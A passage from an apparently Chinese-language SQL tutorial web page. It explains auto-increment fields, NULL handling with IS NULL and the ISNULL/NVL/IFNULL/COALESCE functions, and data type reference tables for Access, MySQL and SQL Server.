<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID Integer PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS Access 使用 AUTOINCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTOINCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 autoincrement 改为 AUTOINCREMENT(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Oracle 的语法</p>
<p>在 Oracle 中，代码稍微复杂一点。</p>
<p>您必须通过 sequence 对象（该对象生成数字序列）创建 auto-increment 字段。</p>
<p>请使用下面的 CREATE SEQUENCE 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">SEQUENCE</span> seq_person</span><br><span class="line"><span class="keyword">MINVALUE</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">WITH</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">INCREMENT</span> <span class="keyword">BY</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">CACHE</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>上面的代码创建一个名为 seq_person 的 sequence 对象，它以 1 起始且以 1 递增。该对象缓存 10 个值以提高性能。cache 选项规定了为了提高访问速度要存储多少个序列值。</p>
<p>要在 “Persons” 表中插入新记录，我们必须使用 nextval 函数（该函数从 seq_person 序列中取回下一个值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">ID</span>,FirstName,LastName)</span><br><span class="line">VALUES (<span class="name">seq_person</span>.nextval,'Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋值为来自 seq_person 序列的下一个数字。”FirstName”列 会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<p>给已经存在的colume添加自增语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> column_name column_name data_type(<span class="keyword">size</span>) constraint_name AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">CHANGE</span> <span class="keyword">id</span> <span class="keyword">id</span> <span class="built_in">INT</span>( <span class="number">11</span> ) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NULL-值"><a href="#SQL-NULL-值" class="headerlink" title="SQL NULL 值"></a>SQL NULL 值</h4><hr>
<p>NULL 值代表遗漏的未知数据。</p>
<p>默认地，表的列可以存放 NULL 值。</p>
<p>本章讲解 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL NULL 值</p>
<p>如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以 NULL 值保存。</p>
<p>NULL 值的处理方式与其他值不同。</p>
<p>NULL 用作未知的或不适用的值的占位符。</p>
<p><strong>注释：</strong>无法比较 NULL 和 0；它们是不等价的。</p>
<hr>
<p>SQL 的 NULL 值处理</p>
<p>请看下面的 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>假如 “Persons” 表中的 “Address” 列是可选的。这意味着如果在 “Address” 列插入一条不带值的记录，”Address” 列会使用 NULL 值保存。</p>
<p>那么我们如何测试 NULL 值呢？</p>
<p>无法使用比较运算符来测试 NULL 值，比如 =、&lt; 或 &lt;&gt;。</p>
<p>我们必须使用 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL IS NULL</p>
<p>我们如何仅仅选取在 “Address” 列中带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NULL 操作符：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT LastName,FirstName,Address <span class="keyword">FROM</span> Persons</span><br><span class="line">WHERE<span class="built_in"> Address </span>IS <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>请始终使用 IS NULL 来查找 NULL 值。</p>
<hr>
<p>SQL IS NOT NULL</p>
<p>我们如何仅仅选取在 “Address” 列中不带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NOT NULL 操作符：</p>
<p>SELECT LastName,FirstName,Address FROM Persons<br>WHERE Address IS NOT NULL</p>
<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
</tr>
</tbody></table>
<p>在下一节中，我们了解 ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数。</p>
<h4 id="SQL-NULL-函数"><a href="#SQL-NULL-函数" class="headerlink" title="SQL NULL 函数"></a>SQL NULL 函数</h4><hr>
<p>SQL ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数</p>
<p>请看下面的 “Products” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">ProductName</th>
<th align="left">UnitPrice</th>
<th align="left">UnitsInStock</th>
<th align="left">UnitsOnOrder</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Jarlsberg</td>
<td align="left">10.45</td>
<td align="left">16</td>
<td align="left">15</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Mascarpone</td>
<td align="left">32.56</td>
<td align="left">23</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Gorgonzola</td>
<td align="left">15.67</td>
<td align="left">9</td>
<td align="left">20</td>
</tr>
</tbody></table>
<p>假如 “UnitsOnOrder” 是可选的，而且可以包含 NULL 值。</p>
<p>我们使用下面的 SELECT 语句：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+UnitsOnOrder)</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>在上面的实例中，如果有 “UnitsOnOrder” 值是 NULL，那么结果是 NULL。</p>
<p>微软的 ISNULL() 函数用于规定如何处理 NULL 值。</p>
<p>NVL()、IFNULL() 和 COALESCE() 函数也可以达到相同的结果。</p>
<p>在这里，我们希望 NULL 值为 0。</p>
<p>下面，如果 “UnitsOnOrder” 是 NULL，则不会影响计算，因为如果值是 NULL 则 ISNULL() 返回 0：</p>
<p><strong>SQL Server / MS Access</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">ISNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>Oracle</strong></p>
<p>Oracle 没有 ISNULL() 函数。不过，我们可以使用 NVL() 函数达到相同的结果：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>MySQL</strong></p>
<p>MySQL 也拥有类似 ISNULL() 的函数。不过它的工作方式与微软的 ISNULL() 函数有点不同。</p>
<p>在 MySQL 中，我们可以使用 IFNULL() 函数，如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">IFNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用 COALESCE() 函数，如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="keyword">COALESCE</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--如果alexa列为null值，则赋予0，否则，取原值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">ifnull</span>(alexa,<span class="number">0</span>)<span class="keyword">from</span> websites;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">COALESCE</span>(alexa,<span class="number">0</span>) <span class="keyword">from</span> websites;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-通用数据类型"><a href="#SQL-通用数据类型" class="headerlink" title="SQL 通用数据类型"></a>SQL 通用数据类型</h3><hr>
<p>数据类型定义列中存放的值的种类。</p>
<hr>
<p>SQL 通用数据类型</p>
<p>数据库表中的每个列都要求有名称和数据类型。Each column in a database table is required to have a name and a data type.</p>
<p>SQL 开发人员必须在创建 SQL 表时决定表中的每个列将要存储的数据的类型。数据类型是一个标签，是便于 SQL 了解每个列期望存储什么类型的数据的指南，它也标识了 SQL 如何与存储的数据进行交互。</p>
<p>下面的表格列出了 SQL 中通用的数据类型：</p>
<table>
<thead>
<tr>
<th>CHARACTER(n)</th>
<th>字符/字符串。固定长度 n。</th>
</tr>
</thead>
<tbody><tr>
<td>VARCHAR(n) 或 CHARACTER VARYING(n)</td>
<td>字符/字符串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>BINARY(n)</td>
<td>二进制串。固定长度 n。</td>
</tr>
<tr>
<td>BOOLEAN</td>
<td>存储 TRUE 或 FALSE 值</td>
</tr>
<tr>
<td>VARBINARY(n) 或 BINARY VARYING(n)</td>
<td>二进制串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>INTEGER(p)</td>
<td>整数值（没有小数点）。精度 p。</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>整数值（没有小数点）。精度 5。</td>
</tr>
<tr>
<td>INTEGER</td>
<td>整数值（没有小数点）。精度 10。</td>
</tr>
<tr>
<td>BIGINT</td>
<td>整数值（没有小数点）。精度 19。</td>
</tr>
<tr>
<td>DECIMAL(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。例如：decimal(5,2) 是一个小数点前有 3 位数，小数点后有 2 位数的数字。</td>
</tr>
<tr>
<td>NUMERIC(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。（与 DECIMAL 相同）</td>
</tr>
<tr>
<td>FLOAT(p)</td>
<td>近似数值，尾数精度 p。一个采用以 10 为基数的指数计数法的浮点数。该类型的 size 参数由一个指定最小精度的单一数字组成。</td>
</tr>
<tr>
<td>REAL</td>
<td>近似数值，尾数精度 7。</td>
</tr>
<tr>
<td>FLOAT</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DOUBLE PRECISION</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DATE</td>
<td>存储年、月、日的值。</td>
</tr>
<tr>
<td>TIME</td>
<td>存储小时、分、秒的值。</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>存储年、月、日、小时、分、秒的值。</td>
</tr>
<tr>
<td>INTERVAL</td>
<td>由一些整数字段组成，代表一段时间，取决于区间的类型。</td>
</tr>
<tr>
<td>ARRAY</td>
<td>元素的固定长度的有序集合</td>
</tr>
<tr>
<td>MULTISET</td>
<td>元素的可变长度的无序集合</td>
</tr>
<tr>
<td>XML</td>
<td>存储 XML 数据</td>
</tr>
</tbody></table>
<h3 id="SQL-数据类型快速参考手册"><a href="#SQL-数据类型快速参考手册" class="headerlink" title="SQL 数据类型快速参考手册"></a>SQL 数据类型快速参考手册</h3><p>然而，不同的数据库对数据类型定义提供不同的选择。</p>
<p>下面的表格显示了各种不同的数据库平台上一些数据类型的通用名称：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">Access</th>
<th align="left">SQLServer</th>
<th align="left">Oracle</th>
<th align="left">MySQL</th>
<th align="left">PostgreSQL</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>boolean</em></td>
<td align="left">Yes/No</td>
<td align="left">Bit</td>
<td align="left">Byte</td>
<td align="left">N/A</td>
<td align="left">Boolean</td>
</tr>
<tr>
<td align="left"><em>integer</em></td>
<td align="left">Number (integer)</td>
<td align="left">Int</td>
<td align="left">Number</td>
<td align="left">Int Integer</td>
<td align="left">Int Integer</td>
</tr>
<tr>
<td align="left"><em>float</em></td>
<td align="left">Number (single)</td>
<td align="left">Float Real</td>
<td align="left">Number</td>
<td align="left">Float</td>
<td align="left">Numeric</td>
</tr>
<tr>
<td align="left"><em>currency</em></td>
<td align="left">Currency</td>
<td align="left">Money</td>
<td align="left">N/A</td>
<td align="left">N/A</td>
<td align="left">Money</td>
</tr>
<tr>
<td align="left"><em>string (fixed)</em></td>
<td align="left">N/A</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
</tr>
<tr>
<td align="left"><em>string (variable)</em></td>
<td align="left">Text (&lt;256) Memo (65k+)</td>
<td align="left">Varchar</td>
<td align="left">Varchar Varchar2</td>
<td align="left">Varchar</td>
<td align="left">Varchar</td>
</tr>
<tr>
<td align="left"><em>binary object</em></td>
<td align="left">OLE Object Memo</td>
<td align="left">Binary (fixed up to 8K) Varbinary (&lt;8K) Image (&lt;2GB)</td>
<td align="left">Long Raw</td>
<td align="left">Blob Text</td>
<td align="left">Binary Varbinary</td>
</tr>
</tbody></table>
<p>在不同的数据库中，同一种数据类型可能有不同的名称。即使名称相同，尺寸和其他细节也可能不同！ <strong>请总是检查文档！</strong></p>
<h3 id="SQL-用于各种数据库的数据类型"><a href="#SQL-用于各种数据库的数据类型" class="headerlink" title="SQL 用于各种数据库的数据类型"></a>SQL 用于各种数据库的数据类型</h3><hr>
<p>Microsoft Access、MySQL 和 SQL Server 所使用的数据类型和范围。</p>
<hr>
<h4 id="Microsoft-Access-数据类型"><a href="#Microsoft-Access-数据类型" class="headerlink" title="Microsoft Access 数据类型"></a>Microsoft Access 数据类型</h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Text</td>
<td align="left">用于文本或文本与数字的组合。最多 255 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Memo</td>
<td align="left">Memo 用于更大数量的文本。最多存储 65,536 个字符。<strong>注释：</strong>无法对 memo 字段进行排序。不过它们是可搜索的。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Byte</td>
<td align="left">允许 0 到 255 的数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">Integer</td>
<td align="left">允许介于 -32,768 与 32,767 之间的全部数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">Long</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 之间的全部数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Single</td>
<td align="left">单精度浮点。处理大多数小数。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Double</td>
<td align="left">双精度浮点。处理大多数小数。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Currency</td>
<td align="left">用于货币。支持 15 位的元，外加 4 位小数。<strong>提示：</strong>您可以选择使用哪个国家的货币。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">AutoNumber</td>
<td align="left">AutoNumber 字段自动为每条记录分配数字，通常从 1 开始。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Date/Time</td>
<td align="left">用于日期和时间</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Yes/No</td>
<td align="left">逻辑字段，可以显示为 Yes/No、True/False 或 On/Off。在代码中，使用常量 True 和 False （等价于 1 和 0）。<strong>注释：</strong>Yes/No 字段中不允许 Null 值</td>
<td align="left">1 比特</td>
</tr>
<tr>
<td align="left">Ole Object</td>
<td align="left">可以存储图片、音频、视频或其他 BLOBs（Binary Large OBjects）。</td>
<td align="left">最多 1GB</td>
</tr>
<tr>
<td align="left">Hyperlink</td>
<td align="left">包含指向其他文件的链接，包括网页。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lookup Wizard</td>
<td align="left">允许您创建一个可从下拉列表中进行选择的选项列表。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<hr>
<h4 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h4><p>在 MySQL 中，有三种主要的类型：Text（文本）、Number（数字）和 Date/Time（日期/时间）类型。</p>
<p><strong>Text 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR(size)</td>
<td align="left">保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td align="left">VARCHAR(size)</td>
<td align="left">保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td align="left">ENUM(x,y,z,etc.)</td>
<td align="left">允许您输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。<strong>注释：</strong>这些值是按照您输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)</td>
</tr>
<tr>
<td align="left">SET</td>
<td align="left">与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。</td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT(size)</td>
<td align="left">带符号-128到127 ，无符号0到255。</td>
</tr>
<tr>
<td align="left">SMALLINT(size)</td>
<td align="left">带符号范围-32768到32767，无符号0到65535, size 默认为 6。</td>
</tr>
<tr>
<td align="left">MEDIUMINT(size)</td>
<td align="left">带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9</td>
</tr>
<tr>
<td align="left">INT(size)</td>
<td align="left">带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11</td>
</tr>
<tr>
<td align="left">BIGINT(size)</td>
<td align="left">带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20</td>
</tr>
<tr>
<td align="left">FLOAT(size,d)</td>
<td align="left">带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DOUBLE(size,d)</td>
<td align="left">带有浮动小数点的大数字。在 size 参数中规显示定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DECIMAL(size,d)</td>
<td align="left">作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意：</strong>以上的 size 代表的并不是存储在数据库中的具体的长度，如 int(4) 并不是只能存储4个长度的数字。</p>
<p>实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。就是在显示给用户的方式有点不同外，int(M) 跟 int 数据类型是相同的。</p>
<p>例如：</p>
<p>1、int的值为10 （指定zerofill）</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; int（<span class="number">9</span>）显示结果为<span class="number">000000010</span></span><br><span class="line">&gt; int（<span class="number">3</span>）显示结果为<span class="number">010</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>就是显示的长度不一样而已 都是占用四个字节的空间</p>
</blockquote>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE()</td>
<td align="left">日期。格式：YYYY-MM-DD<strong>注释：</strong>支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="left">DATETIME()</td>
<td align="left"><em>日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="left">TIMESTAMP()</td>
<td align="left"><em>时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>
</tr>
<tr>
<td align="left">TIME()</td>
<td align="left">时间。格式：HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="left">YEAR()</td>
<td align="left">2 位或 4 位格式的年。<strong>注释：</strong>4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody></table>
<p>即便 DATETIME 和 TIMESTAMP 返回相同的格式，它们的工作方式很不同。在 INSERT 或 UPDATE 查询中，TIMESTAMP 自动把自身设置为当前的日期和时间。TIMESTAMP 也接受不同的格式，比如 YYYYMMDDHHMMSS、YYMMDDHHMMSS、YYYYMMDD 或 YYMMDD。</p>
<hr>
<h4 id="SQL-Server-数据类型"><a href="#SQL-Server-数据类型" class="headerlink" title="SQL Server 数据类型"></a>SQL Server 数据类型</h4><p><strong>String 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">char(n)</td>
<td align="left">固定长度的字符串。最多 8,000 个字符。</td>
<td align="left">Defined width</td>
</tr>
<tr>
<td align="left">varchar(n)</td>
<td align="left">可变长度的字符串。最多 8,000 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">varchar(max)</td>
<td align="left">可变长度的字符串。最多 1,073,741,824 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">text</td>
<td align="left">可变长度的字符串。最多 2GB 文本数据。</td>
<td align="left">4 bytes + number of chars</td>
</tr>
<tr>
<td align="left">nchar</td>
<td align="left">固定长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left">Defined width x 2</td>
</tr>
<tr>
<td align="left">nvarchar</td>
<td align="left">可变长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">nvarchar(max)</td>
<td align="left">可变长度的 Unicode 字符串。最多 536,870,912 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ntext</td>
<td align="left">可变长度的 Unicode 字符串。最多 2GB 文本数据。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">bit</td>
<td align="left">允许 0、1 或 NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">binary(n)</td>
<td align="left">固定长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary</td>
<td align="left">可变长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary(max)</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">image</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">tinyint</td>
<td align="left">允许从 0 到 255 的所有数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">smallint</td>
<td align="left">允许介于 -32,768 与 32,767 的所有数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 的所有数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">bigint</td>
<td align="left">允许介于 -9,223,372,036,854,775,808 与 9,223,372,036,854,775,807 之间的所有数字。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">decimal(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">numeric(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">smallmoney</td>
<td align="left">介于 -214,748.3648 与 214,748.3647 之间的货币数据。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">money</td>
